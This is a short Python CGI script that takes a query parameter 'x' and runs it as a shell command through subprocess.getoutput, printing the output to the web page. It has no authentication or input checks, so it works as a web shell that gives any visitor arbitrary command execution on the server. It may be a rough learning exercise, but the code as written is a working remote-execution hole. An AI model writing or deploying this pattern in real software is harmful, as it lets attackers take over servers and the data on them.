#!/usr/bin/python3

import cgi

print("content-type: text/html")
print()



print("python code")
form=cgi.FieldStorage()
cmd=form.getvalue("x")

print(cmd)


import subprocess
x=subprocess.getoutput(cmd)
#file.write("\n")
print(x)


